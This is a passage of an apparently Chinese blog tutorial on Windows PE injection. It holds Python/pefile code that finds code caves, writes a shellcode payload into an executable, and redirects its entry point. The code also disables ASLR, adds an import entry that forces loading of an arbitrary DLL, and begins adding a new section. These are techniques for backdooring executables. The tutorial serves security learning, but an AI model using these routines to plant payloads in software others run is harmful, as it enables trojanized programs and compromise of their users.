<!DOCTYPE html>
<html>
  <head>
     
    <meta charset="UTF-8">
    <title>注入、劫持和Hook——Windows安全入门（一） - REOP</title>
    <link rel="shortcut icon" href="/static/img/icon.png">
    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
    
<link rel="stylesheet" href="/static/kico.css">
<link rel="stylesheet" href="/static/hingle.css">

    
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
    <meta property="og:site_name" content="REOP">
    <meta property="og:title" content="注入、劫持和Hook——Windows安全入门（一）"/>
    
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="REOP" type="application/atom+xml">
</head>

  <body>
    <header>
    <div class="head-title">
        <h4>REOP</h4>
    </div>
    <div class="head-action">
        <div class="toggle-btn"></div>
        <div class="light-btn"></div>
        <div class="search-btn"></div>
    </div>
    <form class="head-search" method="post">
        <input type="text" name="s" placeholder="搜索什么？">
    </form>
    <nav class="head-menu">
        <a href="/">首页</a>
        <div class="has-child">
            <a>分类</a>
            <div class="sub-menu">
                <a class="category-link" href="/categories/Windows/">Windows</a>
            </div>
        </div>
        
    </nav>
</header>

    <main>
    <div class="wrap min">
        <section class="post-title">
            <h2>注入、劫持和Hook——Windows安全入门（一）</h2>
            <div class="post-meta">
                <time class="date">2024.03.02</time>
            
                <span class="category"><a class="category-link" href="/categories/Windows/">Windows</a></span>
            
            </div>
        </section>
        <article class="post-content">
        
            <h2 id="1-PE注入"><a href="#1-PE注入" class="headerlink" title="1 PE注入"></a>1 PE注入</h2><p>PE注入就是对静态的PE文件进行修改，使其在运行时能够加载我们需要的构造的代码。因为都是对文件进行静态的修改，只需要处理好RVA和Offset之间的转换，保证PE完整的结构就好，相对来说比较简单。<br>此部分代码都使用Python实现，使用pefile模块对PE文件进行操作，十分方便。当然因为PE的结构就是通过头文件定义的，使用C语言也很方便。</p>
<h3 id="1-1-寻找空洞"><a href="#1-1-寻找空洞" class="headerlink" title="1.1 寻找空洞"></a>1.1 寻找空洞</h3><p>寻找代码中的空闲区域的大小，作为PE注入前的参考。<br>参考了<em><strong>cave miner</strong></em>项目，但是我没有研究其源码，只是按照其原理通过比较节表中的 SizeOfRawData 和 Misc_VirtualSize 属性，实现了最简单的功能。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pefile <span class="token keyword">import</span> PE  
<span class="token keyword">import</span> sys  
  
  
<span class="token keyword">def</span> <span class="token function">search_cave</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> minsize<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
    <span class="token triple-quoted-string string">"""  
    搜索代码空洞  
    """</span>    pe <span class="token operator">=</span> PE<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>  
    caves <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] FileAlign:\t</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>FileAlignment<span class="token punctuation">&#125;</span></span><span class="token string">Bytes"</span></span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] SectAlign:\t</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment<span class="token punctuation">&#125;</span></span><span class="token string">Bytes\n"</span></span><span class="token punctuation">)</span>  
    <span class="token comment"># 1. Cave Before Sections  </span>
    sectionDataBegin <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData  
    sectionTableEnd <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__file_offset__ <span class="token operator">+</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sizeof<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    caveSize <span class="token operator">=</span> sectionDataBegin <span class="token operator">-</span> sectionTableEnd <span class="token operator">-</span> <span class="token number">40</span>  
    RVA <span class="token operator">=</span> sectionTableEnd  
    flags <span class="token operator">=</span> <span class="token number">0</span>  
    <span class="token keyword">if</span> caveSize <span class="token operator">></span> minsize<span class="token punctuation">:</span>  
       caves<span class="token punctuation">.</span>append<span class="token punctuation">(</span>  
          <span class="token punctuation">[</span><span class="token string">'BEFORE '</span> <span class="token operator">+</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sectionTableEnd <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">,</span> sectionDataBegin<span class="token punctuation">,</span> caveSize<span class="token punctuation">,</span> RVA<span class="token punctuation">,</span>  
           flags<span class="token punctuation">]</span><span class="token punctuation">)</span>  
    <span class="token comment"># 2. Cave In Each Sections  </span>
    <span class="token keyword">for</span> section <span class="token keyword">in</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">:</span>  
       caveSize <span class="token operator">=</span> section<span class="token punctuation">.</span>SizeOfRawData <span class="token operator">-</span> section<span class="token punctuation">.</span>Misc_VirtualSize  
       <span class="token keyword">if</span> caveSize <span class="token operator">></span> minsize<span class="token punctuation">:</span>  
          begin <span class="token operator">=</span> section<span class="token punctuation">.</span>PointerToRawData <span class="token operator">+</span> section<span class="token punctuation">.</span>Misc_VirtualSize  
          RVA <span class="token operator">=</span> section<span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> section<span class="token punctuation">.</span>Misc_VirtualSize  
          flags <span class="token operator">=</span> <span class="token punctuation">(</span>section<span class="token punctuation">.</span>Characteristics <span class="token operator">&amp;</span> <span class="token number">0xf0000000</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">29</span>  
          <span class="token comment"># print(flags)  </span>
          caves<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'IN '</span> <span class="token operator">+</span> section<span class="token punctuation">.</span>Name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> begin<span class="token punctuation">,</span> begin <span class="token operator">+</span> caveSize<span class="token punctuation">,</span> caveSize<span class="token punctuation">,</span> RVA<span class="token punctuation">,</span> flags<span class="token punctuation">]</span><span class="token punctuation">)</span>  
    <span class="token keyword">for</span> cave <span class="token keyword">in</span> caves<span class="token punctuation">:</span>  
       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] "</span> <span class="token operator">+</span> cave<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">":\n"</span><span class="token punctuation">)</span>  
       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\tBegin:\t"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>cave<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">"h\n"</span><span class="token punctuation">)</span>  
       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\tEnd:\t"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>cave<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">"h\n"</span><span class="token punctuation">)</span>  
       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\tSize:\t"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>cave<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'h ('</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>cave<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'Bytes)'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">"\n"</span><span class="token punctuation">)</span>  
       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\tRVA:\t"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>cave<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">"h\n"</span><span class="token punctuation">)</span>  
       flags <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'---'</span><span class="token punctuation">)</span>  
       <span class="token keyword">if</span> cave<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">4</span><span class="token punctuation">:</span>  
          flags<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'w'</span>  
       <span class="token keyword">if</span> cave<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">:</span>  
          flags<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'r'</span>  
       <span class="token keyword">if</span> cave<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>  
          flags<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'x'</span>  
       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\tFlags:\t"</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flags<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">"\n"</span><span class="token punctuation">)</span>  
  
  
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>  
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>  
       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[Usage] python search.py &lt;filename> [minsize]"</span><span class="token punctuation">)</span>  
       exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>  
       search_cave<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  
    <span class="token keyword">else</span><span class="token punctuation">:</span>  
       search_cave<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="1-2-注入shellcode"><a href="#1-2-注入shellcode" class="headerlink" title="1.2 注入shellcode"></a>1.2 注入shellcode</h3><p>向空洞中注入shellcode，然后修改OEP指向shellcode的入口。需要注意的是要确保注入点的节具有执行权限。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">inject_shellcode</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  
    <span class="token triple-quoted-string string">"""  
    代码空洞注入shellcode  
    """</span>    pe <span class="token operator">=</span> PE<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>  
    rva <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_rva_from_offset<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>  
    data_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">5</span>  
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>data_size<span class="token punctuation">)</span><span class="token punctuation">:</span>  
       <span class="token keyword">if</span> pe<span class="token punctuation">.</span>__data__<span class="token punctuation">[</span>offset <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>  
          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] The cave is too small!"</span><span class="token punctuation">)</span>  
          <span class="token keyword">return</span>  
    <span class="token comment"># 添加call指令  </span>
    opcode <span class="token operator">=</span> <span class="token string">b'\xe8'</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">-</span>data_size<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">,</span> signed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  
    payload <span class="token operator">+=</span> opcode  
    <span class="token comment"># 修改OEP  </span>
    new_oep <span class="token operator">=</span> rva <span class="token operator">+</span> data_size <span class="token operator">-</span> <span class="token number">5</span>  
    pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>AddressOfEntryPoint <span class="token operator">=</span> new_oep  
    <span class="token comment"># 关闭ASLR  </span>
    pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>DllCharacteristics <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">0xff</span>  
    <span class="token comment"># 定位节  </span>
    inject_section <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  
    <span class="token keyword">for</span> section <span class="token keyword">in</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">:</span>  
       <span class="token keyword">if</span> offset <span class="token operator">&lt;=</span> section<span class="token punctuation">.</span>PointerToRawData <span class="token operator">+</span> section<span class="token punctuation">.</span>SizeOfRawData<span class="token punctuation">:</span>  
          inject_section <span class="token operator">=</span> section  
          <span class="token keyword">break</span>  
    inject_section<span class="token punctuation">.</span>Characteristics <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">0xe0000000</span>  
    <span class="token comment"># 注入shellcode  </span>
    pe<span class="token punctuation">.</span>__data__ <span class="token operator">=</span> pe<span class="token punctuation">.</span>__data__<span class="token punctuation">[</span><span class="token punctuation">:</span>offset<span class="token punctuation">]</span> <span class="token operator">+</span> payload <span class="token operator">+</span> pe<span class="token punctuation">.</span>__data__<span class="token punctuation">[</span>offset <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  
    <span class="token comment"># pe.set_data_bytes(offset, shellcode)  </span>
    <span class="token comment"># 写入文件  </span>
    modified_filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.exe'</span><span class="token punctuation">,</span> <span class="token string">'_injected.exe'</span><span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>write<span class="token punctuation">(</span>modified_filename<span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Injected PE file saved as: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>modified_filename<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="1-3-注入导入表"><a href="#1-3-注入导入表" class="headerlink" title="1.3 注入导入表"></a>1.3 注入导入表</h3><p>通过注入导入表使PE文件可以加载任意的DLL，但是导入表的后面一般没有足够的空间来添加表项，此时需要将原来的整个导入表复制到足够大的空洞处再新增表项，同时修改可选头中标识的导入表的RVA。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">inject_import</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">:</span>  
    <span class="token triple-quoted-string string">"""  
    注入导入表  
    :return:  
    """</span>    pe <span class="token operator">=</span> PE<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>  
    <span class="token comment"># 复制旧IDT  </span>
    IDT_offset <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_offset_from_rva<span class="token punctuation">(</span>pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>DATA_DIRECTORY<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span>  
    IDT_size <span class="token operator">=</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>DATA_DIRECTORY<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Size <span class="token operator">-</span> <span class="token number">20</span>  
    IDT_data <span class="token operator">=</span> pe<span class="token punctuation">.</span>__data__<span class="token punctuation">[</span>IDT_offset<span class="token punctuation">:</span>IDT_offset<span class="token operator">+</span>IDT_size<span class="token punctuation">]</span>  
    pe<span class="token punctuation">.</span>set_data_bytes<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> IDT_data<span class="token punctuation">)</span>  
    <span class="token comment"># 新建一个IDT项  </span>
    begin <span class="token operator">=</span> offset <span class="token operator">+</span> IDT_size  
    new_IDT <span class="token operator">=</span> SectionStructure<span class="token punctuation">(</span>pe<span class="token punctuation">.</span>__IMAGE_IMPORT_DESCRIPTOR_format__<span class="token punctuation">)</span>  
    new_IDT<span class="token punctuation">.</span>__unpack__<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>new_IDT<span class="token punctuation">.</span>sizeof<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
    new_IDT<span class="token punctuation">.</span>set_file_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>  
    begin <span class="token operator">+=</span> <span class="token number">40</span>  
    <span class="token comment"># INT  </span>
    new_IDT<span class="token punctuation">.</span>OriginalFirstThunk <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_rva_from_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>  
    new_INT <span class="token operator">=</span> SectionStructure<span class="token punctuation">(</span>pe<span class="token punctuation">.</span>__IMAGE_THUNK_DATA_format__<span class="token punctuation">)</span>  
    new_INT<span class="token punctuation">.</span>__unpack__<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>new_INT<span class="token punctuation">.</span>sizeof<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
    new_INT<span class="token punctuation">.</span>set_file_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>  
    begin <span class="token operator">+=</span> <span class="token number">8</span>  
    <span class="token comment"># IAT  </span>
    new_IDT<span class="token punctuation">.</span>FirstThunk <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_rva_from_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>  
    new_IAT <span class="token operator">=</span> SectionStructure<span class="token punctuation">(</span>pe<span class="token punctuation">.</span>__IMAGE_THUNK_DATA_format__<span class="token punctuation">)</span>  
    new_IAT<span class="token punctuation">.</span>__unpack__<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>new_IAT<span class="token punctuation">.</span>sizeof<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
    new_IAT<span class="token punctuation">.</span>set_file_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>  
    begin <span class="token operator">+=</span> <span class="token number">8</span>  
    <span class="token comment"># funcName  </span>
    funcName <span class="token operator">=</span> <span class="token string">b'\x00\x00show\x00'</span>  
    pe<span class="token punctuation">.</span>set_data_bytes<span class="token punctuation">(</span>begin<span class="token punctuation">,</span> funcName<span class="token punctuation">)</span>  
    new_INT<span class="token punctuation">.</span>AddressOfData <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_rva_from_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>  
    new_IAT<span class="token punctuation">.</span>AddressOfData <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_rva_from_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>  
    begin <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>funcName<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span>  
    <span class="token comment"># dllName  </span>
    dllName <span class="token operator">=</span> <span class="token string">b'Hello.dll\x00'</span>  
    pe<span class="token punctuation">.</span>set_data_bytes<span class="token punctuation">(</span>begin<span class="token punctuation">,</span> dllName<span class="token punctuation">)</span>  
    new_IDT<span class="token punctuation">.</span>Name <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_rva_from_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>__structures__<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_IDT<span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>__structures__<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_INT<span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>__structures__<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_IAT<span class="token punctuation">)</span>  
    <span class="token comment"># 更改扩展头中的IDT的地址  </span>
    pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>DATA_DIRECTORY<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_rva_from_offset<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>DATA_DIRECTORY<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Size <span class="token operator">+=</span> <span class="token number">20</span>  
    <span class="token comment"># 修改节权限  </span>
    inject_section <span class="token operator">=</span> <span class="token boolean">None</span>  
    <span class="token keyword">for</span> section <span class="token keyword">in</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">:</span>  
       <span class="token keyword">if</span> offset <span class="token operator">&lt;=</span> section<span class="token punctuation">.</span>PointerToRawData <span class="token operator">+</span> section<span class="token punctuation">.</span>SizeOfRawData<span class="token punctuation">:</span>  
          inject_section <span class="token operator">=</span> section  
          <span class="token keyword">break</span>  
    inject_section<span class="token punctuation">.</span>Characteristics <span class="token operator">=</span> <span class="token number">0xc0000000</span>  
    <span class="token comment"># pe.merge_modified_section_data()  </span>
    <span class="token comment">#  写入文件  </span>
    modified_filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.exe'</span><span class="token punctuation">,</span> <span class="token string">'_dll.exe'</span><span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>write<span class="token punctuation">(</span>modified_filename<span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Modified PE file saved as: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>modified_filename<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="1-4-新增节"><a href="#1-4-新增节" class="headerlink" title="1.4 新增节"></a>1.4 新增节</h3><p>如果现有的代码空洞不足以进行注入，那么可以通过更改PE结构来开辟更多的空洞。<br>利用节表和节数据之间的空闲区域再新增一个节，网上有很多详细的讲解，这里就不再赘述。<br>为了不需要移动其他的节数据，一般是在文件末尾新增节。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add_section</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> data_size<span class="token punctuation">)</span><span class="token punctuation">:</span>  
    <span class="token triple-quoted-string string">"""  
    新增节  
    :return: offset of new section data  
    """</span>    pe <span class="token operator">=</span> PE<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>  
    data_size <span class="token operator">+=</span> <span class="token number">5</span>  
    <span class="token comment"># 计算是否足够新增节区头  </span>
    begin <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__file_offset__ <span class="token operator">+</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sizeof<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    end <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData  
    cave_size <span class="token operator">=</span> end <span class="token operator">-</span> begin  
    <span class="token comment"># data_size = len(shellcode) + 5  </span>
    <span class="token keyword">if</span> cave_size <span class="token operator">&lt;</span> <span class="token number">80</span><span class="token punctuation">:</span>  
       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] There is not enough cave to add a section header."</span><span class="token punctuation">)</span>  
       <span class="token keyword">return</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] There are </span><span class="token interpolation"><span class="token punctuation">&#123;</span>cave_size <span class="token operator">-</span> <span class="token number">40</span><span class="token punctuation">&#125;</span></span><span class="token string"> (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cave_size<span class="token punctuation">&#125;</span></span><span class="token string"> - 40) bytes cave to add section header."</span></span><span class="token punctuation">)</span>  
    <span class="token comment"># 构造新的节表  </span>
    new_section <span class="token operator">=</span> SectionStructure<span class="token punctuation">(</span>pe<span class="token punctuation">.</span>__IMAGE_SECTION_HEADER_format__<span class="token punctuation">)</span>  
    new_section<span class="token punctuation">.</span>__unpack__<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>new_section<span class="token punctuation">.</span>sizeof<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
    new_section<span class="token punctuation">.</span>set_file_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>  
    new_section<span class="token punctuation">.</span>Name <span class="token operator">=</span> <span class="token string">b'.new'</span>  
